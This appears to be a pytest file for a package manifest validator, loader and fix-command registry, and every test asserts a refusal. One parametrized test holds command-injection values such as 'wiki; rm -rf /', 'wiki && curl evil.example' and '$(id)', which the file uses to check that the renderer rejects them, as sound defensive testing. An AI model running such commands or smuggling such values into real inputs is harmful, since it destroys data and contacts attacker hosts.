"""The package validator, the loader's built-in finding, and the fix registry.

Every test here is about a REFUSAL. The wizard package standard
is only worth
anything if the refusals are real, so each one is asserted on its own rather
than through a happy-path validation that happens to pass.

Run:
    pytest tests/test_wizard_packages.py
"""
from __future__ import annotations

import json
import os

import pytest

from puffpai.wizard import fixes, loader
from puffpai.wizard import manifest as pkg_manifest
from puffpai.wizard.manifest import PackageError

GOOD = {
    "schema": "puffpai_package/v1",
    "id": "sources",
    "kind": "skill",
    "version": "1.0.0",
    "author": "puffpai",
    "license": "Apache-2.0",
    "label": "What it learns from",
    "reads": ["persona", "machine"],
    "writes": "sources",
    "permissions": {"network_hosts": ["download.kiwix.org"], "files": ["data"],
                    "ha_domains": [], "secrets": []},
    "doors": [],
    "secrets": [],
    "egress": "build_only",
    "estimate": {"bytes": 0, "seconds": 20, "basis": "measured:this_machine"},
    "rerun": "idempotent",
    "undo": "reversible",
    "blocking": False,
}


def _manifest(**changes) -> dict:
    data = json.loads(json.dumps(GOOD))
    for key, value in changes.items():
        if value is _DROP:
            data.pop(key, None)
        else:
            data[key] = value
    return data


class _Drop:
    pass


_DROP = _Drop()


def _write_package(tmp_path, folder: str, data: dict, *, code: str = "") -> str:
    path = tmp_path / folder
    path.mkdir()
    (path / "manifest.json").write_text(json.dumps(data), encoding="utf-8")
    if code:
        (path / "skill.py").write_text(code, encoding="utf-8")
    return str(path)


# -- the manifest rules -------------------------------------------------------

def test_a_good_manifest_validates():
    out = pkg_manifest.validate(_manifest(), builtin=False)
    assert out["writes"] == "sources"
    assert out["permissions"]["network_hosts"] == ["download.kiwix.org"]
    assert out["builtin"] is False


def test_unknown_key_is_refused():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(tier="community"), builtin=False)
    assert "unknown keys" in str(exc.value)
    assert "tier" in str(exc.value)


def test_a_signature_field_is_an_unknown_key():
    # v1 has no signing (spec A.2). A field recording an unverifiable claim is
    # worse than no field, so it is refused rather than ignored.
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(signature="deadbeef"), builtin=False)


def test_two_writes_sections_are_refused():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(writes=["sources", "knowledge"]),
                              builtin=False)
    assert "exactly one section" in str(exc.value)


def test_no_writes_section_is_refused():
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(writes=_DROP), builtin=False)


def test_an_unknown_section_is_refused():
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(writes="whatever"), builtin=False)
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(reads=["whatever"]), builtin=False)


@pytest.mark.parametrize("section", ["posture", "egress", "brain", "prove"])
def test_reserved_sections_are_refused_from_a_non_builtin_package(section):
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(writes=section), builtin=False)
    assert "reserved section" in str(exc.value)


@pytest.mark.parametrize("section", ["posture", "brain", "prove"])
def test_reserved_sections_are_allowed_to_a_builtin_package(section):
    out = pkg_manifest.validate(_manifest(writes=section), builtin=True)
    assert out["writes"] == section


def test_the_run_section_is_nobodys_to_write_not_even_a_builtin():
    for builtin in (True, False):
        with pytest.raises(PackageError) as exc:
            pkg_manifest.validate(_manifest(writes="run"), builtin=builtin)
        assert "runner's own record" in str(exc.value)


def test_a_manifest_may_not_claim_to_be_builtin():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(builtin=True), builtin=False)
    assert "calls itself built-in" in str(exc.value)


def test_a_builtin_may_not_disown_where_it_came_from():
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(builtin=False), builtin=True)


@pytest.mark.parametrize("secrets", [["vault:openweather_key"], ["anything"]])
def test_non_empty_secrets_are_refused(secrets):
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(secrets=secrets), builtin=True)
    assert "nowhere safe" in str(exc.value)


def test_secrets_in_the_permissions_block_are_refused_too():
    perms = dict(GOOD["permissions"], secrets=["vault:ha_token"])
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(permissions=perms), builtin=True)
    assert "credential path" in str(exc.value)


def test_ha_domains_are_refused_in_v1():
    perms = dict(GOOD["permissions"], ha_domains=["light"])
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(permissions=perms), builtin=True)


def test_files_outside_data_are_refused():
    perms = dict(GOOD["permissions"], files=["data", "/etc"])
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(permissions=perms), builtin=True)
    assert "'data' directory" in str(exc.value)


@pytest.mark.parametrize("host", [
    "192.168.1.5", "*.kiwix.org", "https://kiwix.org", "kiwix.org:443",
    "localhost", "kiwix", "", "[::1]", "down load.kiwix.org",
])
def test_a_host_must_be_a_registrable_name(host):
    perms = dict(GOOD["permissions"], network_hosts=[host])
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(permissions=perms), builtin=True)
    assert "registrable NAME" in str(exc.value)


def test_egress_none_with_hosts_is_refused():
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(egress="none"), builtin=True)


@pytest.mark.parametrize("bad_id", ["Sources", "s", "a" * 40, "1source",
                                    "source-s", "apps", "vault", "agents"])
def test_the_id_pattern_and_the_reserved_ids_are_both_checked(bad_id):
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(id=bad_id), builtin=True)


def test_only_brain_and_secure_may_block():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(blocking=True), builtin=True)
    assert "Only brain and secure" in str(exc.value)
    assert pkg_manifest.validate(
        _manifest(id="brain", writes="brain", blocking=True),
        builtin=True)["blocking"] is True


def test_a_third_party_author_is_refused():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(_manifest(author="someone"), builtin=False)
    assert "signature this build cannot check" in str(exc.value)


def test_a_skill_must_say_what_it_can_undo():
    with pytest.raises(PackageError):
        pkg_manifest.validate(_manifest(undo=_DROP), builtin=True)


def test_an_invented_estimate_basis_is_refused():
    with pytest.raises(PackageError) as exc:
        pkg_manifest.validate(
            _manifest(estimate={"bytes": 1, "seconds": 2, "basis": "about"}),
            builtin=True)
    assert "invented number is a defect" in str(exc.value)


def test_limits_may_go_under_the_ceiling_and_never_over():
    ok = pkg_manifest.validate(_manifest(limits={"timeout_s": 5}), builtin=True)
    assert ok["limits"]["timeout_s"] == 5
    with pytest.raises(PackageError):
        pkg_manifest.validate(
            _manifest(limits={"timeout_s": pkg_manifest.MAX_TIMEOUT_S + 1}),
            builtin=True)


# -- where a package IS decides what it may do --------------------------------

def test_a_package_outside_the_shipped_dir_is_not_builtin(tmp_path):
    path = _write_package(tmp_path, "sources", _manifest())
    package = loader.load_package(path)
    assert package.builtin is False


def test_a_package_outside_the_shipped_dir_cannot_take_a_reserved_section(tmp_path):
    path = _write_package(tmp_path, "sources", _manifest(writes="posture"))
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "reserved section" in str(exc.value)


def test_a_package_claiming_builtin_from_outside_is_refused_for_the_claim(tmp_path):
    path = _write_package(tmp_path, "sources",
                          _manifest(builtin=True, writes="posture"))
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "calls itself built-in" in str(exc.value)


def test_non_builtin_code_is_never_loaded(tmp_path):
    marker = tmp_path / "ran.txt"
    code = f"open({str(marker)!r}, 'w').write('x')\n"
    path = _write_package(tmp_path, "sources", _manifest(), code=code)
    package = loader.load_package(path)
    with pytest.raises(PackageError) as exc:
        loader.load_module(package)
    assert "did not ship with this build" in str(exc.value)
    assert not marker.exists()


def test_the_folder_name_and_the_manifest_id_must_agree(tmp_path):
    path = _write_package(tmp_path, "tools", _manifest())
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "cannot disagree" in str(exc.value)


def test_a_stray_file_in_a_package_is_refused(tmp_path):
    path = _write_package(tmp_path, "sources", _manifest())
    (tmp_path / "sources" / "notes.txt").write_text("hi", encoding="utf-8")
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "not part of a package" in str(exc.value)


def test_a_subdirectory_other_than_data_is_refused(tmp_path):
    path = _write_package(tmp_path, "sources", _manifest())
    os.makedirs(os.path.join(path, "bin"))
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "not an allowed directory" in str(exc.value)


def test_a_bytecode_folder_in_a_non_builtin_package_is_still_refused(tmp_path):
    path = _write_package(tmp_path, "sources", _manifest())
    os.makedirs(os.path.join(path, "__pycache__"))
    with pytest.raises(PackageError) as exc:
        loader.load_package(path)
    assert "not an allowed directory" in str(exc.value)


def test_python_s_own_bytecode_folder_does_not_break_a_builtin_package(
        tmp_path, monkeypatch):
    # Python writes __pycache__ next to every skill.py it imports, on any
    # machine without PYTHONDONTWRITEBYTECODE. Refusing it broke every
    # built-in package from the second request on.
    monkeypatch.setattr(loader, "BUILTIN_DIR", str(tmp_path))
    path = _write_package(tmp_path, "sources", _manifest())
    os.makedirs(os.path.join(path, "__pycache__"))
    package = loader.load_package(path)
    assert package.builtin
    packages, refusals = loader.load_builtin_packages(str(tmp_path))
    assert refusals == []
    assert sorted(packages) == ["sources"]
    assert packages["sources"].builtin


def test_other_folders_stay_refused_even_in_a_builtin_package(
        tmp_path, monkeypatch):
    monkeypatch.setattr(loader, "BUILTIN_DIR", str(tmp_path))
    path = _write_package(tmp_path, "sources", _manifest())
    os.makedirs(os.path.join(path, "bin"))
    with pytest.raises(PackageError):
        loader.load_package(path)


def test_a_bad_package_does_not_take_the_others_down(tmp_path):
    _write_package(tmp_path, "sources", _manifest())
    _write_package(tmp_path, "tools", {"schema": "nope"})
    packages, refusals = loader.load_builtin_packages(str(tmp_path))
    assert sorted(packages) == ["sources"]
    assert len(refusals) == 1 and "schema" in refusals[0]


# -- the twelve that ship -----------------------------------------------------

def test_every_shipped_package_validates_and_is_builtin():
    packages, refusals = loader.load_builtin_packages()
    assert refusals == []
    from puffpai.wizard.runner import SKILL_ORDER
    assert sorted(packages) == sorted(SKILL_ORDER)
    assert all(p.builtin for p in packages.values())


def test_one_writer_per_section_across_the_twelve():
    packages, _ = loader.load_builtin_packages()
    owners: dict[str, str] = {}
    for package in packages.values():
        assert package.writes not in owners, (
            f"{package.id} and {owners.get(package.writes)} both write "
            f"{package.writes}")
        owners[package.writes] = package.id
    assert owners["posture"] == "secure"
    assert owners["brain"] == "brain"
    assert owners["prove"] == "prove"


def test_only_brain_and_secure_ship_blocking():
    packages, _ = loader.load_builtin_packages()
    blocking = sorted(p.id for p in packages.values() if p.blocking)
    assert blocking == ["brain", "secure"]


def test_no_shipped_package_asks_for_a_secret_or_a_home_assistant_domain():
    packages, _ = loader.load_builtin_packages()
    for package in packages.values():
        assert package.manifest["secrets"] == []
        assert package.manifest["permissions"]["secrets"] == []
        assert package.manifest["permissions"]["ha_domains"] == []


# -- the fix registry ---------------------------------------------------------

def test_the_registered_fix_commands_render_exactly():
    assert fixes.render({"kind": "command", "id": "source.fetch",
                         "args": {"source_id": "wikipedia_en"}}) == (
        "puffpai sources add wikipedia_en")
    assert fixes.render({"kind": "command", "id": "knowledge.sync",
                         "args": {}}) == "puffpai knowledge sync"
    assert fixes.render({"kind": "command", "id": "persona.rename_id",
                         "args": {"persona_id": "apps",
                                  "new_id": "infinity"}}) == (
        "puffpai persona edit apps --rename-id infinity")


def test_an_unknown_fix_command_id_is_refused():
    with pytest.raises(fixes.FixError) as exc:
        fixes.render({"kind": "command", "id": "rm.everything", "args": {}})
    assert "Nothing in this build runs" in str(exc.value)


def test_a_fix_is_never_a_string():
    with pytest.raises(fixes.FixError):
        fixes.render("puffpai knowledge sync")


@pytest.mark.parametrize("value", [
    "wiki; rm -rf /", "wiki && curl evil.example", "$(id)", "a b", "--flag",
    "", 7, None, "x" * 200,
])
def test_an_argument_that_is_not_a_plain_token_is_refused(value):
    with pytest.raises(fixes.FixError):
        fixes.render({"kind": "command", "id": "source.fetch",
                      "args": {"source_id": value}})


def test_an_undeclared_argument_is_refused():
    with pytest.raises(fixes.FixError) as exc:
        fixes.render({"kind": "command", "id": "knowledge.sync",
                      "args": {"dest": "D:\\packs"}})
    assert "not among them" in str(exc.value)


def test_a_gap_with_an_unusable_fix_still_gets_a_usable_one():
    record = fixes.gap(skill="integrate", what="w", why="y", impact="i",
                       fix={"kind": "command", "id": "nope.nope", "args": {}})
    assert record["fix"] == {"kind": "command", "id": "setup.rerun", "args": {}}
    assert record["fix_command"] == "puffpai setup"
    assert record["recorded_at"].endswith("Z")
    assert record["blocking"] is False
